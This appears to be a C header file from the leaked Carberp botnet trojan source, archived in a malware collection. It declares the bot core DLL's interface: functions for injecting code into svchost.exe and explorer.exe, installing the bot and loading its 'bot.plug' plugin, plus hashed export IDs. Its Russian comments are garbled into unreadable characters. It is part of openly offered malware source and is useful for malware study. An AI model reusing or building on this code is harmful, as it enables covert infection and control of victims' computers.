/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

//------------------------------------------------------------
//   ������ ��������� ���������� ���� CoreDlll.dll
//------------------------------------------------------------

typedef DWORD (WINAPI *TInjectFunc)(LPVOID);

//=============================================
//  ��������� �������
//=============================================

// ������� ������� � ������� svchost.exe
typedef BOOL (WINAPI *TMegaJump)(TInjectFunc Function);

// ������� �������� ����� ������ ���������� � ������ � ��
typedef BOOL (WINAPI *TJmpToExplorer)(TInjectFunc Function);

// ������� ������� � ���������� ������� ����������
typedef BOOL (WINAPI *TInjectIntoExplorer)(TInjectFunc Function);

// ������� ���������� ����
typedef BOOL (WINAPI *TInstall)(const char* FileName, BOOL IsUpdate, BOOL DeleteSourceFile, DWORD SourceFileProcessPID);

// ������� �������� ������� ���� bot.plug
typedef BOOL (WINAPI *TLoadBotPlug)(LPVOID* Buf, DWORD *BufSize);

// ������� ����������� ������ ���������� ��� ������ ���� bot.plug
typedef BOOL (WINAPI *TFreeBotPlug)(LPVOID Buf);


//=============================================
//  ���� �������������� �������
//=============================================
#define COREDLL_MEGAJUMP           0x19C6E1CE /* MegaJump */
#define COREDLL_JMPTOEXPLORER      0xA6DAED5E /* JmpToExplorer */
#define COREDLL_INJECTINTOEXPLORER 0x99D0BF59 /* InjectIntoExplorer */
#define COREDLL_INSTALL            0x3E99511B /* Install */
#define COREDLL_LOADBOTPLUG		   0xFC392336 /* LoadBP */
#define COREDLL_FREEBOTPLUG        0x2CB96367 /* FreeBP */